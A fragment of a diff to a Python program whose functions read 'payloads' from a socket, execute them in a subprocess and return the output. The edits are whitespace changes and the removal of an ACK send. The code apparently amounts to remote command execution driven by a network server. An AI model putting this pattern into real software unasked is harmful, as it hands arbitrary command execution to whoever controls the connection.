@@ -84,7 +84,9 @@ def _execute_payload(payload: str, sock: socket.socket) -> None:
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
             )
+
             output, _ = proc.communicate()
+
             if output is None:
                 output = b""
 
@@ -100,6 +102,7 @@ def _execute_payload(payload: str, sock: socket.socket) -> None:
 
 def _receive_payload(sock: socket.socket) -> str | None:
     """Read a null-terminated payload from the socket."""
+
     buffer = bytearray()
 
     while True:
@@ -137,9 +140,6 @@ def main() -> None:
 
             if payload is None:
                 break
-
-            # Server ACK for write framing.
-            sock.sendall(b"\x00")
 
             _execute_payload(payload, sock)
 
